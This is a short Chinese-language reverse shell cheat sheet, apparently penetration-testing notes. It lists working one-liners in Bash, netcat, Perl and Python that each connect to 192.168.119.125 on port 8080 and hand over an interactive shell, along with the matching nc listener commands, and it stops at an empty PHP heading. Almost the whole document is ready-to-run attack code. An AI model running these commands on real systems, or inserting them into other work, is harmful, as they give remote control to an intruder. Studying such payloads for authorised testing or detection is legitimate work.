# Reverse Shell

reverse shell的cheat sheet



### shell的集合

https://www.revshells.com/

### Bash

```bash
bash -i >& /dev/tcp/192.168.119.125/8080 0>&1
 
bash -c "bash -i >& /dev/tcp/192.168.119.125/8080 0>&1"
```

```bash
nc -nvlp 8080
```



### NC

-e不可用时候

```bash
rm -f /tmp/d; mkfifo /tmp/d; /bin/sh -c "cat /tmp/d | /bin/sh -i 2>&1 | nc 192.168.119.125 8080 > /tmp/d"
 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.125 8080 >/tmp/f
```

-e 可用

```bash
nc -e /bin/sh 192.168.119.125 8080
```

```bash
nc -nvlp 8080
```



### Perl

```perl
perl -e 'use Socket;$i="192.168.119.125";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.119.125:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```bash
nc -nvlp 8080
```



### Python

python3 以及python2都可用

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.125",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.125",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

另外的形式 2/3都可用

```python
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.119.125',8080))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```

```bash
nc -nvlp 8080
```



### php